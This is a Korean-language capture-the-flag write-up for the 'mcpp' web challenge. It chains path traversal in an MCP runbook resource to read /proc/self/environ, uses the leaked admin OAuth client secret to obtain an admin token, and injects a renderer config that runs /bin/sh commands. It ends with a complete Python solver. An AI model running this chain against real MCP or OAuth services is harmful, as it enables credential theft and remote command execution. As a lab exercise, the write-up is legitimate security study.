---
title: "HyperSonic CTF 2026 mcpp Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 mcpp 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Web"]
draft: false
listed: false
---

# mcpp

## 개요

`mcpp`는 OAuth 인증을 거친 뒤 MCP 엔드포인트에서 `resource`와 `tool`을 호출하는 `web` 문제입니다. 사용자 권한의 MCP 세션에서는 runbook `resource`를 읽을 수 있고, 관리자 권한을 얻으면 `artifact`를 쓰는 도구까지 접근할 수 있습니다.

확인한 조건은 다음과 같습니다.

- 카테고리: `web`
- 주요 인터페이스: OAuth token flow, MCP `resources/read`, MCP `tools/call`
- 사용자 권한: `hypersonic:user`
- 관리자 권한: `hypersonic:admin`
- 목표: 사용자 권한에서 시작해 관리자 MCP 도구를 열고, `preview` 렌더러를 통해 flag를 읽습니다.

풀이에서 먼저 확인할 부분은 runbook `resource`가 URI의 `ref` 값을 어떻게 처리하는지입니다. 이 경로 처리에서 파일 읽기를 얻고, 환경 변수에서 나온 관리자 `secret`을 OAuth 권한 상승으로 연결합니다. 이후 `admin_write_artifact`와 `read_artifact`의 `preview` 설정 구조를 맞추면 명령 실행까지 이어집니다.

## 문제 분석

먼저 글에서 사용할 용어를 정리합니다.

- `MCP session`: Bearer 토큰으로 `/mcp`에 `initialize`를 보낸 뒤, 응답 헤더의 `mcp-session-id`를 이어서 사용하는 세션입니다.
- `resource`: MCP의 `resources/read`로 읽는 대상입니다. 이 문제에서는 `hypersonic://runbook/{ref}` 형태의 URI가 보입니다.
- `tool`: MCP의 `tools/call`로 실행하는 기능입니다.
- `artifact`: 서비스가 관리하는 분석 결과 객체입니다. 일부 도구는 이 객체를 쓰거나 읽습니다.
- `profile.defaults.views`: `artifact`의 `preview` 동작을 정하는 설정입니다.
- `adapter`, `renderer`, `command`: `preview` 생성 과정에서 차례로 참조되는 값입니다.

인증 흐름은 일반 사용자 권한에서 시작합니다. 동적 클라이언트 등록 후 PKCE를 붙인 authorization code grant를 진행하면 `hypersonic:user` 범위의 토큰을 받을 수 있습니다. 이 토큰으로 `/mcp`에 `initialize`를 보내고 `mcp-session-id`를 받은 뒤부터 MCP 요청이 처리됩니다.

MCP `resource` 목록을 보면 runbook을 읽는 URI가 있습니다.

```text
hypersonic://runbook/{ref}
```

여기서 `ref`가 파일 경로로 디코딩됩니다. 따라서 절대 경로를 URL 인코딩해 넣으면 runbook 문서가 아니라 서버의 파일을 읽을 수 있습니다.

```text
hypersonic://runbook/%2Fproc%2Fself%2Fenviron
```

이 요청으로 프로세스 환경 변수가 노출되며, 그 안에서 `HYPERSONIC_ADMIN_CLIENT_SECRET` 값을 확인할 수 있었습니다. 이 값은 관리자 클라이언트의 `secret`으로 쓰입니다.

다음으로 토큰 발급 경로를 확인했습니다. 사용자 로그인에 쓰인 `/token`과 별개로, `POST /oauth/token`에서 `client_credentials` grant가 동작합니다.

```text
grant_type=client_credentials
client_id=hypersonic-admin
client_secret=<leaked secret>
scope=hypersonic:admin
```

이렇게 받은 토큰으로 MCP 세션을 다시 열면 관리자용 도구가 추가됩니다. 여기서 풀이에 필요한 도구는 `admin_write_artifact`입니다. 이 도구는 `artifact_json` 인자를 받는데, 값은 JSON 객체가 아니라 JSON 문자열이어야 합니다.

`admin_write_artifact`로 쓴 `artifact`는 다시 `read_artifact`로 읽을 때 `preview`가 생성됩니다. `preview` 동작을 맞춰 보니 기본 설정 조회가 다음 구조를 따릅니다.

```text
adapter  = defaults["views"]["preview"]["adapter"]
renderer = views["adapters"][adapter]["renderer"]
command  = views["renderers"][renderer]["command"]
```

처음에는 `defaults["adapters"]`와 `defaults["renderers"]`에 값을 넣었지만 기본 `renderer`가 그대로 실행됐습니다.

```text
["/bin/echo", "artifact-preview-ready"]
```

조회가 `defaults.views` 내부에서 계속 이어지기 때문입니다. 따라서 `adapters`와 `renderers`도 `defaults.views` 아래에 넣어야 `preview`의 `command`를 바꿀 수 있습니다.

## 핵심 아이디어

풀이 흐름은 네 단계로 나눌 수 있습니다.

```text
1. OAuth PKCE 흐름으로 사용자 토큰을 얻는다.
2. MCP runbook resource의 경로 처리 문제로 파일을 읽는다.
3. 환경 변수에서 관리자 클라이언트 `secret`을 얻고 관리자 토큰을 발급받는다.
4. 관리자 artifact의 preview 설정을 조작해 renderer가 command를 실행하게 한다.
```

첫 번째 취약점은 runbook `resource`가 `ref`를 안전한 문서 식별자로 제한하지 않는다는 점입니다. 이 때문에 사용자 권한만으로도 서버 내부 파일을 읽을 수 있고, 환경 변수에 있던 관리자 `secret`이 다음 단계의 입력이 됩니다.

두 번째 연결점은 OAuth token endpoint입니다. 관리자 클라이언트 `secret`을 알고 있으면 `client_credentials` grant로 `hypersonic:admin` 범위의 토큰을 받을 수 있습니다. 관리자 권한을 얻은 뒤에는 숨겨진 MCP 도구가 보이고, 그중 `admin_write_artifact`가 `preview` 설정을 바꾸는 통로가 됩니다.

마지막으로 `preview` 렌더러의 설정 조회 위치가 중요합니다. `preview.adapter`는 `defaults.views.preview`에서 읽고, 이후 `adapters`와 `renderers`도 같은 `views` 객체 아래에서 찾습니다. 그래서 payload는 top-level `defaults`가 아니라 `defaults.views` 안에 `command`를 실행하는 렌더러를 구성해야 합니다.

## 풀이 과정

### Step 1. 사용자 토큰으로 MCP 세션 열기

먼저 동적 클라이언트를 등록하고 PKCE 값을 준비합니다. `/authorize` 요청은 redirect URL에 authorization code를 붙여 돌려주므로, 이 authorization code와 `code_verifier`를 `/token`에 제출하면 사용자 토큰을 얻습니다.

토큰을 얻은 뒤에는 `/mcp`에 `initialize` 요청을 보냅니다. 응답 헤더에 들어 있는 `mcp-session-id`를 이후 요청 헤더에 넣어야 `resources/read`와 `tools/call`을 정상적으로 사용할 수 있습니다.

이 단계에서 얻는 값은 사용자 권한의 MCP 세션입니다. 아직 관리자 도구는 보이지 않지만, runbook `resource`를 읽을 수 있으므로 다음 단계에서 파일 읽기를 시도할 수 있습니다.

### Step 2. runbook `resource`로 환경 변수 읽기

runbook URI는 `hypersonic://runbook/{ref}` 형태입니다. `ref`가 URL 디코딩된 뒤 파일 경로처럼 사용되므로, 절대 경로를 인코딩해 넣으면 임의 파일 읽기가 됩니다.

```text
hypersonic://runbook/%2Fproc%2Fself%2Fenviron
```

응답은 일반 runbook markdown처럼 반환되지만 실제 내용은 프로세스 환경 변수입니다. 여기서 관리자 토큰 발급에 필요한 `secret`을 얻습니다.

```text
HYPERSONIC_ADMIN_CLIENT_SECRET=<secret>
```

flag 후보 경로를 직접 읽는 방식도 시도했지만, 이 단계에서는 flag가 나오지 않았습니다. 따라서 파일 읽기는 권한 상승에 필요한 `secret`을 얻는 용도로 사용합니다.

### Step 3. 관리자 토큰과 도구 목록 확인

환경 변수에서 얻은 `secret`을 `hypersonic-admin` 클라이언트의 `secret`으로 사용합니다. 숨겨진 `/oauth/token` 경로는 `client_credentials` grant를 받아들이므로, 다음 요청으로 관리자 범위의 토큰을 발급받을 수 있습니다.

```text
POST /oauth/token
grant_type=client_credentials
client_id=hypersonic-admin
client_secret=<secret>
scope=hypersonic:admin
```

새 토큰으로 MCP 세션을 열고 도구 목록을 확인하면 관리자 도구가 추가됩니다. 풀이에서는 `admin_write_artifact`로 새 `artifact`를 쓰고, `read_artifact`로 `preview` 생성을 유도했습니다.

### Step 4. `preview` 설정을 명령 실행으로 연결

`admin_write_artifact`의 인자 `artifact_json`은 JSON 문자열입니다. 이 문자열 안에 `profile.defaults.views`를 넣으면 `preview` 기본 동작을 바꿀 수 있습니다.

payload에서 필요한 구조는 다음과 같습니다.

```json
{
  "profile": {
    "defaults": {
      "views": {
        "preview": { "adapter": "process" },
        "adapters": {
          "process": { "renderer": "process" }
        },
        "renderers": {
          "process": {
            "command": ["/bin/sh", "-c", "id"]
          }
        }
      }
    }
  }
}
```

`preview.adapter`가 `process`를 가리키고, 같은 `views` 객체 안의 `adapters.process.renderer`가 다시 `process` 렌더러를 가리킵니다. 마지막으로 `views.renderers.process.command`가 실제 실행할 명령 배열이 됩니다.

이 구조로 `artifact`를 쓴 뒤 `read_artifact`를 호출하면 `preview` 생성 과정에서 지정한 `command`가 실행됩니다. 먼저 hostname을 읽는 명령으로 동작을 확인했고, 이후 `/readflag` 실행으로 연결했습니다.

## Exploit / Solver

최종 코드는 사용자 토큰 발급, runbook 파일 읽기, 관리자 토큰 발급, 명령 실행용 `preview` 생성 순서로 동작합니다. 아래는 풀이에 필요한 핵심 루틴입니다.

```python
import base64
import hashlib
import json
import os
import secrets
import urllib.parse

import requests


BASE = "<base-url>"
REDIRECT_URI = "http://127.0.0.1/callback"


class McpClient:
    def __init__(self, token):
        self.session = requests.Session()
        self.next_id = 1
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream",
        }

    def start(self):
        res = self.session.post(
            f"{BASE}/mcp",
            headers=self.headers,
            json={
                "jsonrpc": "2.0",
                "id": self.next_id,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2025-06-18",
                    "capabilities": {},
                    "clientInfo": {"name": "client", "version": "0.1"},
                },
            },
            timeout=10,
        )
        self.next_id += 1
        res.raise_for_status()
        self.headers["mcp-session-id"] = res.headers["mcp-session-id"]

        self.session.post(
            f"{BASE}/mcp",
            headers=self.headers,
            json={"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}},
            timeout=10,
        )

    def request(self, method, params):
        res = self.session.post(
            f"{BASE}/mcp",
            headers=self.headers,
            json={"jsonrpc": "2.0", "id": self.next_id, "method": method, "params": params},
            timeout=15,
        )
        self.next_id += 1
        res.raise_for_status()
        return res.json()

    def tool(self, name, arguments=None):
        data = self.request("tools/call", {"name": name, "arguments": arguments or {}})
        return data["result"]["content"][0]["text"]

    def read_resource(self, uri):
        data = self.request("resources/read", {"uri": uri})
        return data["result"]["contents"][0]["text"]

    def lfi(self, path):
        uri = "hypersonic://runbook/" + urllib.parse.quote(path, safe="")
        return self.read_resource(uri)


def pkce_user_token():
    session = requests.Session()
    reg = session.post(
        f"{BASE}/register",
        json={
            "redirect_uris": [REDIRECT_URI],
            "client_name": "client",
            "grant_types": ["authorization_code", "refresh_token"],
            "response_types": ["code"],
            "scope": "hypersonic:user",
            "token_endpoint_auth_method": "client_secret_post",
        },
        timeout=10,
    )
    reg.raise_for_status()
    client = reg.json()

    verifier = base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=")
    digest = hashlib.sha256(verifier.encode()).digest()
    challenge = base64.urlsafe_b64encode(digest).decode().rstrip("=")

    auth = session.get(
        f"{BASE}/authorize",
        params={
            "response_type": "code",
            "client_id": client["client_id"],
            "redirect_uri": REDIRECT_URI,
            "scope": "hypersonic:user",
            "state": "x",
            "code_challenge": challenge,
            "code_challenge_method": "S256",
        },
        allow_redirects=False,
        timeout=10,
    )
    auth.raise_for_status()
    query = urllib.parse.urlparse(auth.headers["Location"]).query
    code = urllib.parse.parse_qs(query)["code"][0]

    token = session.post(
        f"{BASE}/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "client_id": client["client_id"],
            "client_secret": client["client_secret"],
            "code_verifier": verifier,
        },
        timeout=10,
    )
    token.raise_for_status()
    return token.json()["access_token"]


def parse_environ(text):
    env = {}
    for item in text.split("\x00"):
        if "=" in item:
            key, value = item.split("=", 1)
            env[key] = value
    return env


def admin_token(secret):
    res = requests.post(
        f"{BASE}/oauth/token",
        data={
            "grant_type": "client_credentials",
            "client_id": "hypersonic-admin",
            "client_secret": secret,
            "scope": "hypersonic:admin",
        },
        timeout=10,
    )
    res.raise_for_status()
    return res.json()["access_token"]


def command_artifact(command):
    suffix = secrets.token_hex(3).upper()
    artifact_id = f"HYP-F{suffix}"
    profile_name = f"p{suffix.lower()}"
    return artifact_id, {
        "id": artifact_id,
        "title": "Preview",
        "severity": "low",
        "summary": "preview command",
        "component": "preview",
        "affected_assets": ["preview"],
        "owner": "client",
        "tags": ["preview"],
        "profile": {
            "name": profile_name,
            "defaults": {
                "views": {
                    "preview": {"adapter": "process"},
                    "adapters": {"process": {"renderer": "process"}},
                    "renderers": {"process": {"command": command}},
                }
            },
        },
    }


def run_command(command):
    user = McpClient(pkce_user_token())
    user.start()
    env = parse_environ(user.lfi("/proc/self/environ"))

    admin = McpClient(admin_token(env["HYPERSONIC_ADMIN_CLIENT_SECRET"]))
    admin.start()

    artifact_id, artifact = command_artifact(command)
    admin.tool("admin_write_artifact", {"artifact_json": json.dumps(artifact)})
    obj = json.loads(admin.tool("read_artifact", {"artifact_id": artifact_id}))
    preview = obj["preview"]
    return preview.get("stdout", "") + preview.get("stderr", "")


print(run_command(["/bin/sh", "-c", "test -x /readflag && /readflag"]))
```

여기서 주의할 부분은 `command_artifact`의 `profile.defaults.views` 구조입니다. `adapters`와 `renderers`를 `views` 밖에 두면 `preview`는 기본 echo 렌더러를 계속 사용합니다. 반대로 위 구조처럼 `views` 내부에 두면 `read_artifact` 과정에서 지정한 `command`가 실행됩니다.

## 결과

먼저 `["/bin/cat", "/etc/hostname"]` 명령으로 `preview`가 기본 echo 렌더러가 아니라 지정한 `command`를 실행한다는 점을 확인했습니다. 이후 `/readflag`를 실행해 다음 flag를 얻었습니다.

```text
hs{4341f4768ce2bd952d7efe73cb8cfac8321feb4aab3bf1de41c178f9598fb328}
```
